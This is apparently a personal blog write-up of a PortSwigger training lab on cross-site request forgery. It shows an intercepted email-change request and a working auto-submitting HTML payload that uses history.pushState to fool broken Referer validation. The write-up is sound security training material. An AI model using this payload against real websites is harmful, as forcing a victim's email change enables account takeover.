---
layout: post
title: "CSRF with broken Referer validation"
date: 2026-10-19
description: "PortSwigger CSRF lab where Referer validation is fooled by a pushState URL containing the target domain."
series: PortSwigger CSRF
categories:
  - CTF
  - PortSwigger
tags:
  - CSRF
  - Web
---

## Description

This [lab](https://portswigger.net/web-security/csrf/lab-referer-validation-broken){:target="_blank"}'s email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

## Steps

Intercepting the new request:

```http
POST /my-account/change-email HTTP/2
Host: 0a3e000e0385886180de804800ae0063.web-security-academy.net
Cookie: session=0gnQgRdBPXfBUD3PX68BU13RlhdYel5c
Content-Length: 25
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Origin: https://0a3e000e0385886180de804800ae0063.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3e000e0385886180de804800ae0063.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Sec-Gpc: 1
Priority: u=0, i

email=test2%40example.com
```

Same as the previous labs, we can spoof the `Referer` header with the HTML below, leveraging the `history.pushState` JS method. Modern browsers strip the query string by default as a security measure unless the `Referrer-Policy: unsafe-url` header is set.

```html
<h1>Lab 11</h1>

<script>history.pushState('','','/?0a3e000e0385886180de804800ae0063.web-security-academy.net')</script>

<form action="https://0a3e000e0385886180de804800ae0063.web-security-academy.net/my-account/change-email" method="post">
  <input type="hidden" name="email" value="jawad-lab11@example.com">
</form>

<script> document.forms[0].submit(); </script>
```
